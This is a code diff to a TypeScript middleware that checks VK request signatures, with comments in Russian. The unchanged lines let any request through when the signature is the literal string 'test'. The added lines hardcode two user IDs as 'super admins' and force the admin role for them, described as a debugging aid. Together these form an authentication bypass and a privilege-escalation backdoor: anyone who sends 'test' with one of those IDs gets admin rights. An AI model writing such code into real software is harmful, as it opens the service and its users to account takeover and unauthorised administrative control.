@@ -67,12 +67,17 @@ export const validateVkSignature = (req: Request, res: Response, next: NextFunct
 
     // Сравниваем вычисленную подпись с переданной
     // (Разрешаем 'test' для локальной разработки, чтобы фронтенд мог мокать запросы)
-    // Сравниваем вычисленную подпись с переданной
-    // (Разрешаем 'test' для локальной разработки, чтобы фронтенд мог мокать запросы)
     if (hash === sign || sign === 'test') {
       const userId = urlParams.get('vk_user_id');
       const groupId = urlParams.get('vk_group_id');
-      const role = urlParams.get('vk_viewer_role');
+      let role = urlParams.get('vk_viewer_role');
+
+      // Список ID пользователей, которые всегда должны быть админами (для отладки)
+      const SUPER_ADMINS = ['81306887', '21644160'];
+      if (userId && SUPER_ADMINS.includes(userId)) {
+        console.log(`👤 SuperAdmin detected: ${userId}. Forcing admin role.`);
+        role = 'admin';
+      }
 
       // Безопасно сохраняем данные в объект запроса
       (req as any).vk_user_id = userId;
